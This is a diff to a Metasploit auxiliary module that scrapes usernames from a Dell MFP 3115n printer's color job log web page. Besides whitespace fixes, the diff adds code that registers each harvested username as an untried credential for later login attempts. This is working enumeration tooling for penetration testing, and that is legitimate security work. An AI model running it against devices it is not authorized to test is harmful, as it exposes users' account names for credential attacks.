@@ -16,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Dell MFP 3115n color job username exractor',
       'Description'    => %{
-      	This module is used to harvests the usernames from the color job log file on a Dell MFP 3115n.	
+      	This module is used to harvests the usernames from the color job log file on a Dell MFP 3115n.
       },
       'Author'         =>
         [
@@ -36,7 +36,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-  
+
     print_status("Attempting to enumerate usernames from: #{rhost}")
 
     users = get_usernames()
@@ -58,12 +58,16 @@ class Metasploit3 < Msf::Auxiliary
     loot_desc     = "Dell MFP Username Harvester"
     p = store_loot(loot_name, loot_type, datastore['RHOST'], usernames , loot_filename, loot_desc)
     print_status("Credentials saved in: #{p.to_s}")
+
+    users.each do | user |
+       register_creds('DELL-HTTP', rhost, '80', user, "")
+    end
   end
 
 
   def get_usernames()
     usernames = []
-      
+
     begin
         res = send_request_cgi(
           {
@@ -79,21 +83,51 @@ class Metasploit3 < Msf::Auxiliary
         print_error("#{rhost}:#{rport} - Connection failed.")
         return false
       end
-      
+
       html_body = ::Nokogiri::HTML(res.body)
       record_total = html_body.xpath('/html/body/table/tr/td/table[3]/tr/td/table/td').length
       record_loop = record_total/10
 
       $i = 13
       print_status("Trying to extract usernames")
-      while record_loop > 0 do 
+      while record_loop > 0 do
 		tr_name = html_body.xpath("/html/body/table/tr/td/table[3]/tr/td/table/td[#{$i}]").text
 		unless  tr_name.blank?
 			usernames << tr_name.strip
-		end 
+		end
 		$i = $i + 10
 		record_loop -= 1
 	  end
     return usernames.uniq!
+  end
+
+  def register_creds (service_name, remote_host, remote_port, username, password)
+    credential_data = {
+       origin_type: :service,
+       module_fullname: self.fullname,
+       workspace_id: myworkspace.id,
+       private_data: password,
+       username: username,
+       }
+
+    service_data = {
+      address: remote_host,
+      port: remote_port,
+      service_name: service_name,
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+      }
+
+    credential_data.merge!(service_data)
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      workspace_id: myworkspace_id
+    }
+
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
   end
 end
